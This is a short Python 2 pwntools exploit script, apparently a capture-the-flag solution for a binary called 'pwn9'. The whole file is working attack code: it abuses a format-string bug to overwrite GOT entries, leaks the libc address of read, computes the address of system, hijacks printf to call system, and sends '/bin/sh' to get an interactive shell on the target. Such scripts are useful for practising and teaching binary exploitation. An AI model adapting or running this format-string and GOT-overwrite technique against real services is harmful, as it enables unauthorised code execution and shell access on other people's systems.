from pwn import * 
context.log_level = 'debug'

cn = process('./pwn9')
#cn = remote('ctf.cnss.studio',5009)
bin = ELF('./pwn9')
#libc = ELF('./libc')
libc = ELF('/lib32/libc.so.6')


cn.recv()

pay = fmtstr_payload(4, {bin.got['_IO_putc'] : bin.symbols['main']})
cn.sendline(pay)
cn.recv()

pay = '%5$s' + p32(bin.got['read'])
cn.sendline(pay)
cn.recvuntil('is:\n')
p_read = u32(cn.recv()[:4])
print 'p_read : '+hex(p_read)

p_system = p_read - libc.symbols['read'] + libc.symbols['system']

pay = fmtstr_payload(4, {bin.got['printf'] : p_system})
cn.sendline(pay)
cn.recv()

cn.sendline('/bin/sh\0')
cn.recv()
cn.interactive()
